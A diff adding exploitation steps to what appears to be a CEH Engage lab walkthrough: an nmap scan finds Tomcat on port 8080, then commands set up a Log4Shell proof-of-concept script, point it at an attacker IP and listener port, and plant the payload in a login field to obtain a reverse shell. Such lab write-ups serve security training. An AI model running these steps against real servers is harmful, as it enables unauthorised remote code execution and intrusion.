@@ -276,6 +276,15 @@ You have identified a vulnerable web application on a Linux server at port 8080.
 
 nmap -sV -T4 -p8080 172.30.10.0/24
 172.30.10.99	8080 http Apache Tomcat/Coyote JSP engine 1.1
+
+#Exploitation
+tar -xf jdk-8u202-linux-x64.tar.gz
+mv jdk1.8.0_202 /usr/bin
+cd log4j-shell-poc
+pluma poc.py
+Line [62,87,99] replace jdk1.8.0_20 to /usr/bin/jdk1.8.0_202
+python3 poc.py --userip <attackerIP> --webport 8080 --lport 9001
+#Put the payload on username field and password is password > wait for rev shell
 writeup: https://github.com/3ls3if/Cybersecurity-Notes/blob/main/readme/ceh-engage-walkthrough/ceh-engage-part-3.md
 -------------------------------------------
 Challenge 8:
